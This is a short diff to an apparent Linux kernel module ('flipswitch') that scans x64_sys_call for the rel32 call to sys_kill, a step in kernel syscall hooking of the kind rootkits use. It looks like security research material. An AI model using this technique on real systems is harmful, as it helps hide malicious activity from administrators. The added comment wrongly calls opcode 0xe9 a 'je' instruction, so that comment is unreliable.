@@ -193,7 +193,7 @@ static int __init flipswitch_init(void)
 
     /* Search for call instruction to sys_kill in x64_sys_call */
     for (size_t i = 0; i < DUMP_SIZE - 4; ++i) {
-        if (func_ptr[i] == 0xe8) { /* Found a call instruction */
+        if (func_ptr[i] == 0xe8 || func_ptr[i] == 0xe9) { /* Found a call or je instruction */
             int32_t rel = *(int32_t *)(func_ptr + i + 1);
             void *call_addr = (void *)((uintptr_t)x64_sys_call + i + 5 + rel);
             
